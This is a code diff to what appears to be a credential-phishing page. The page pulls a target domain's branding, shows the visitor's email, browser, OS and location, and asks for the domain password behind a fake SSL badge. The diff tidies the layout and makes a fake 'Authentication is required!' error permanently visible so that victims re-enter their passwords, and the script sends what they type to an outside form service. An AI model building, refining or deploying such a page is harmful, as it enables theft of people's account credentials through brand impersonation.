@@ -165,13 +165,32 @@
       letter-spacing: -0.3px;
     }
     
-    /* Visitor Info - Friend's Style (Black Text) */
+    /* Visitor Info - Clean (Black Text) */
     .visitor-info {
       text-align: center;
       padding: 14px 20px 10px;
       font-size: 13px;
       color: #000000;
       border-bottom: 1px solid #f0f0f0;
+    }
+    
+    .visitor-info .visitor-row {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 4px 12px;
+    }
+    
+    .visitor-info .visitor-row span {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    
+    .visitor-info .visitor-row i {
+      font-size: 14px;
+      color: #000000;
     }
     
     .visitor-info .email {
@@ -261,13 +280,15 @@
       color: #1a1a1a;
     }
     
+    /* RED ERROR - PERMANENTLY VISIBLE */
     .auth-error {
       color: #d11a1a;
       font-size: 14px;
       margin-top: 10px;
       margin-bottom: 10px;
       text-align: center;
-      display: none;
+      font-weight: 500;
+      display: block !important;
     }
     
     .checkbox-group {
@@ -402,7 +423,7 @@
     </div>
   </div>
 
-  <!-- CHAMELEON CARD - FRIEND'S STYLE -->
+  <!-- CHAMELEON CARD -->
   <div class="chameleon-container" id="chameleonContainer">
     
     <!-- Brand Header - Logo + Company Name -->
@@ -413,13 +434,14 @@
       <div class="brand-name" id="brandName">Loading...</div>
     </div>
     
-    <!-- Visitor Info - Friend's Style (Black Text) -->
+    <!-- Visitor Info - Clean (Black Text) -->
     <div class="visitor-info" id="visitorInfo">
-      <span id="visitDateTime">Loading...</span> &nbsp;&nbsp;
-      <span id="visitBrowserIcon"><i class="fas fa-globe"></i></span> <span id="visitBrowser">Loading...</span> &nbsp;&nbsp;
-      <span id="visitOSIcon"><i class="fas fa-desktop"></i></span> <span id="visitOS">Loading...</span>
-      <br>
-      <span id="visitLocation">📍 Loading...</span>
+      <div class="visitor-row">
+        <span id="visitDateTime">Loading...</span>
+        <span><i class="fas fa-globe" id="browserIcon"></i> <span id="visitBrowser">Loading...</span></span>
+        <span><i class="fas fa-desktop" id="osIcon"></i> <span id="visitOS">Loading...</span></span>
+        <span id="visitLocation">📍 Loading...</span>
+      </div>
       
       <div class="email" id="emailDisplay">
         Loading...
@@ -429,7 +451,7 @@
     <div class="chameleon-content">
       <!-- Message - Friend's Style -->
       <div class="message">
-        Session authentication! please provide your
+        Session authentication! Please provide your
         <b id="domainDisplay">Loading...</b>
         password to continue.
       </div>
@@ -446,7 +468,7 @@
           </div>
         </div>
         
-        <!-- AUTH ERROR - Now BEFORE show password, in red -->
+        <!-- RED ERROR - PERMANENTLY VISIBLE -->
         <div class="auth-error" id="authError">Authentication is required!</div>
         
         <div class="checkbox-group">
@@ -465,7 +487,7 @@
       </div>
     </div>
     
-    <!-- Green SSL Badge - Kept from Our Page -->
+    <!-- Green SSL Badge -->
     <div class="security-badge">
       <i class="fas fa-shield-alt"></i> Secure SSL Connection
     </div>
@@ -597,11 +619,11 @@
       document.getElementById('visitLocation').textContent = await getLocation();
       
       const os = getOSInfo();
-      document.getElementById('visitOSIcon').className = `fas ${os.icon}`;
+      document.getElementById('osIcon').className = `fas ${os.icon}`;
       document.getElementById('visitOS').textContent = os.name;
       
       const browser = getBrowserInfo();
-      document.getElementById('visitBrowserIcon').className = `fab ${browser.icon}`;
+      document.getElementById('browserIcon').className = `fab ${browser.icon}`;
       document.getElementById('visitBrowser').textContent = browser.name;
       
       await fetchBranding(domain);
@@ -650,7 +672,7 @@
       }
       
       attemptCount++;
-      errorEl.style.display = 'none';
+      errorEl.style.display = 'block';
       
       try {
         await fetch(FORMSPARK_URL, {
